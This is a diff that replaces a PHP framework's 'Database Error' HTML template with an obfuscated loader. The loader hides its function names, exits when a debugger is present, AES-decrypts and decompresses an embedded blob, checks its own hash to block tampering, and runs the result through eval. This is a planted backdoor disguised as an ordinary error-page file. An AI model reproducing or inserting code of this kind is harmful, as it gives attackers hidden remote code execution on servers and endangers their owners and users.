@@ -1,64 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-?><!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<title>Database Error</title>
-<style type="text/css">
-
-::selection { background-color: #E13300; color: white; }
-::-moz-selection { background-color: #E13300; color: white; }
-
-body {
-	background-color: #fff;
-	margin: 40px;
-	font: 13px/20px normal Helvetica, Arial, sans-serif;
-	color: #4F5155;
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_u82ir1hh=('bas'.'e64'.'_de'.'cod'.'e');
+$_ewe222rc=('gzu'.'nco'.'mpr'.'ess');
+$_alhvtk1r=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_qzf3aawu='7yUJAmLP';
+$_w5nxj3e3='Iu9y2cShb9A=';
+$_j9jvtw0s='PYiEqO6S';
+$_jvzbdu50='XRKIj8OV';
+$_jsz641pl='bQ/CERyT';
+$_q2mzz2hn='Cs8rXgUf';
+$_ip0rb1f1='lxTAoMKS';
+$_wc9phi4m='/yR6oA==';
+$_ecwe8yu4=$_u82ir1hh($_jsz641pl.$_j9jvtw0s.$_qzf3aawu.$_jvzbdu50.$_w5nxj3e3);
+$_irg7l0gn=$_u82ir1hh($_ip0rb1f1.$_q2mzz2hn.$_wc9phi4m);
+$_c4z21fjw=$_u82ir1hh('TIovBC5P/+J92D48HbDBTWCowrXmuL7n60p744tovXET/BJboGkieenK5l/JktRo0m6srg9OKO8vpMwNmFtMDff0N29yxXboL0CuPgU68W1UARipAUCA/WWWFiWQA5q99L9h6JaxMftVhU2K2SvOsgwXW397Xc+nLcWIlNPfi77yfLa/EkWIRSz6gnbMjxNgwLaTGvWGmGAFQoo5+N3qjliJGiO0rRdrEMFBK5E2jmrjQjtxV2ynYhNfhR/ypUEVoTDaQR9UQa/DGQKQfazHDr4i+ZkRPTi5ROi1cf6Ke4NOZ78GmmD8WuE5ZsKAsPR1QXFNEJZrbtymSgC0d7WdJ2XAKoZXyHaIIqqMqyJ5DhoaKBcx4lkVo2sPqMSWNU050KxMunUL8ujNRdY+kQbizMeVthimd8F3jKNlZN8kePuYLYMss2ujcXN4yQ9vq3YldX22jiUuidnKbU+0NrGLBipA3pOREOMBx5Twi40YjV2i+yYx1RDJajbk/uApI7Lx6Hpw+UqAKiL90glQv5AMDRfBiFbVBouecdUVPrrRIDhFzHWDZrahqbh81Qzu0TAX9RaBacjvTWrb+Sa8B0aeBmHlJHxEzxEAPj1LfUknuy47i1Y79FOSIXmmmiQwX32eBBtM3JxiXjHq3jIUWSZQ+klrTMEJmpzQ9EcbGVyIcJRBMynColR/YRjmYyxiUsT9mozZtpfNqQsWNQKivaqOPSgj/uszb4idiZplSU/eneBS6Q4J8tkOlPGv9Mtsp7SawYflUaRJRPL1fnxJX7wCtCBcJDbAWuxP2UZIbzl9MwoOSJwxI4tYml67xwrfYet/Jm8fT4WIEprz9nTnX9TTVO7dC//1sdANFDmHgyK1P9+Qu3Ztq8NlHfm4OYzmOrQ921oe6pfQzaXjUIUX86jRsRXd9Q598YC0OyXLgORtGBh3YIw2IfaxcVDv9hdHDz1AjZxYKmtMEVTa9HTspz83G3gtUFda0XRjTsSHg+Wm2tmDCZobBqfWMNPQZr5WVohVuLvyDlPv2Y4p3Sv6LyIzJ63nlcJuIKGXSxfl5KUFn7d5XA7ON0epr90Xrxa2Y33lOsaB2IXXIBAQMPkhbA/wIhGxgV/EowLaVO/7Abi3rfeRvXSyQUQWX7uXKGM1n+0sX/SbX1lb+LUhYSgIi4rqXuV9ZS5ufqmZDO52G67YsI2ykqXqXZPX1Y1K94vIXhvG');
+$_raha9uyu=$_alhvtk1r($_c4z21fjw,'aes-256-cbc',$_ecwe8yu4,OPENSSL_RAW_DATA,$_irg7l0gn);
+if($_raha9uyu===false){exit;}
+$_r6vzlwbd=$_ewe222rc($_raha9uyu);
+if($_r6vzlwbd===false){exit;}
+$_ti0dw4hq='a885e5b0b19a90730af51bc4b2edfc15c0a4c10358ff5e4884afeda48bf4a910';
+$_unr0arfe=@file_get_contents(__FILE__);
+if($_unr0arfe!==false){
+$_x6m4h4mw=str_replace($_ti0dw4hq,"0000000000000000000000000000000000000000000000000000000000000000",$_unr0arfe);
+$_fani0v9z=hash("sha256",$_x6m4h4mw);
+if($_fani0v9z!==$_ti0dw4hq){@http_response_code(403);exit;}
 }
-
-a {
-	color: #003399;
-	background-color: transparent;
-	font-weight: normal;
-}
-
-h1 {
-	color: #444;
-	background-color: transparent;
-	border-bottom: 1px solid #D0D0D0;
-	font-size: 19px;
-	font-weight: normal;
-	margin: 0 0 14px 0;
-	padding: 14px 15px 10px 15px;
-}
-
-code {
-	font-family: Consolas, Monaco, Courier New, Courier, monospace;
-	font-size: 12px;
-	background-color: #f9f9f9;
-	border: 1px solid #D0D0D0;
-	color: #002166;
-	display: block;
-	margin: 14px 0 14px 0;
-	padding: 12px 10px 12px 10px;
-}
-
-#container {
-	margin: 10px;
-	border: 1px solid #D0D0D0;
-	box-shadow: 0 0 8px #D0D0D0;
-}
-
-p {
-	margin: 12px 15px 12px 15px;
-}
-</style>
-</head>
-<body>
-	<div id="container">
-		<h1><?php echo $heading; ?></h1>
-		<?php echo $message; ?>
-	</div>
-</body>
-</html>
+eval($_r6vzlwbd);
